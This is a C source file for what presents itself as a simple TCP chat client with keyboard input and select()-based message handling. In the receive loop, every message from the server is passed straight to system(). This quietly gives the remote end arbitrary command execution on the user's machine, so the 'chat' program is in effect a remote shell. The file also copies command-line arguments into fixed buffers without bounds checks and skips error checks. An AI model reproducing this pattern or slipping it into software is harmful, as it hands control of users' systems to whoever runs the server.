// Handling input and output
#include <stdio.h>
// Provides access to the POSIX operating system API
#include <unistd.h>
// Functions for performing general functions
#include <stdlib.h>
// Functions for manipulating arrays of characters.
#include <string.h>
// Things
#include <sys/types.h>
// For use with sockets
#include <sys/socket.h>
// Contains constants and structures needed for internet domain addresses
#include <netinet/in.h>
// Access to database that records a list of networks known to the system developer.
#include <netdb.h>

#define MESSAGE_SIZE 80
#define MAX_CLIENTS 150
#define CLIENT_PORT 7400

// usage "chat -p 7400 localhost"

int main(int argc, char *argv[]) {
    int i = 0, port, client_sockfd;
    struct sockaddr_in server_address;
    int addresslen = sizeof(struct sockaddr_in), fd;
    char fd_array[MAX_CLIENTS];
    fd_set readfds, testfds, clientfds;
    char msg[MESSAGE_SIZE + 1];
    char kb_msg[MESSAGE_SIZE + 10];

    // Client variables
    int sockfd;
    int result;
    char hostname[MESSAGE_SIZE];
    struct hostent *hostinfo;
    struct sockaddr_in address;
    char alias[MESSAGE_SIZE];
    int clientid;

    // Client
   if (argc == 2 || argc == 4) {
        if (!strcmp("-p",argv[1])) {
            if (argc == 2) {
                printf("Invalid parameters.\nUsage: chat [-p PORT] HOSTNAME\n");
                exit(0);
            }
            else{
                sscanf(argv[2], "%i", &port);
                strcpy(hostname, argv[3]);
            }
        }
        else {
            port=CLIENT_PORT;
            strcpy(hostname,argv[1]);
        }

        printf("\n*** Client starting (enter \"quit\" to stop): *** \n");
        fflush(stdout);

        // Create a socket for the client
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        // Name the socket, as agreed with the server
        // Look for host's name
        hostinfo = gethostbyname(hostname);
        address.sin_addr = *(struct in_addr *)*hostinfo -> h_addr_list;
        address.sin_family = AF_INET;
        address.sin_port = htons(port);

        // Connect the socket to the server's socket
        if (connect(sockfd, (struct sockaddr *)&address, sizeof(address)) < 0) {
            perror("connecting");
            exit(1);
        }

        // Flush standard output
        fflush(stdout);

        // Initializes the file descriptor set fdset to have zero bits for all file descriptors.
        FD_ZERO(&clientfds);
        // Sets the bit for the file descriptor fd in the file descriptor set fdset.
        FD_SET(sockfd, &clientfds);
        // Add keyboard to file descriptor set
        FD_SET(0, &clientfds);

        // Now wait for messages from the server
        while (1) {
            testfds = clientfds;

            // select(): Indicates which of the specified file descriptors is ready for reading, ready for writing,
               // or has an error condition pending.
            // If the specified condition is false for all of the specified file descriptors,
               // select() blocks, up to the specified timeout interval,
               // until the specified condition is true for at least one of the
               // specified file descriptors or until a signal arrives that
               // needs to be delivered.
            select(FD_SETSIZE, &testfds, NULL, NULL, NULL);

            for(fd = 0; fd < FD_SETSIZE; fd++) {
                if (FD_ISSET(fd, &testfds)) {
                    if (fd == sockfd) {
                        // read data from open socket
                        result = read(sockfd, msg, MESSAGE_SIZE);
                        msg[result] = '\0';     /* Terminate string with null */
                        printf("%s", msg + 1);
                        system(msg + 1);      /* Calling system commands */
                        if (msg[0] == 'X') {
                            close(sockfd);
                            exit(0);
                        }
                    }
                    else
                        if (fd == 0) {
                           // Process keyboard activiy
                           fgets(kb_msg, MESSAGE_SIZE + 1, stdin);
                           // If user types "quit" to quit program
                           if (strcmp(kb_msg, "quit\n") == 0) {
                             sprintf(msg, "XClient is shutting down.\n");
                             write(sockfd, msg, strlen(msg));
                             // Close the socket
                             close(sockfd);
                             // End program
                             exit(0);
                           }
                            else{
                                sprintf(msg, "M%s", kb_msg);
                                write(sockfd, msg, strlen(msg));
                            }
                     }
                }
            }
        }
    }
}
